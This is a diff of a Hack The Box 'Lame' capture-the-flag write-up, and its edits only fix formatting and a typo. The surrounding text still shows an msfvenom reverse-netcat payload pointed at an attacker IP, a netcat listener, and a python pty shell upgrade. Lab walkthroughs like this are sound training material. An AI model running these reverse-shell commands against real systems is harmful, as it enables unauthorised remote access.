@@ -211,6 +211,7 @@ For the payload we will use msfvenom to create a reverse shell that we will capt
 ```
 msfvenom -p cmd/unix/reverse_netcat LHOST=<Attacker-IP> LPORT=<Attacker-Port> -f python
 ```
+
 ```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Lame]
 └─$ msfvenom -p cmd/unix/reverse_netcat LHOST=<My IP> LPORT=4444 -f python
@@ -271,7 +272,7 @@ Now we can run it again.. and if we have our listener ready we should be able to
 
 ## Pwnd
 We got a shell back, the first thing we look for is to make it interactive, for that matter we will see if the machine has python with
-```
+
 ```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Lame]
 └─$ nc -lvnp 4444       
@@ -303,16 +304,15 @@ usr
 var
 vmlinuz
 vmlinuz.old
-
-
 ```
 
-```
+
 ```
 which python
 ```
 
-In this particular case that will be enought, we can use the following command to spawn an interactive shell
+In this particular case that will be enough, we can use the following command to spawn an interactive shell
+
 ```python
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
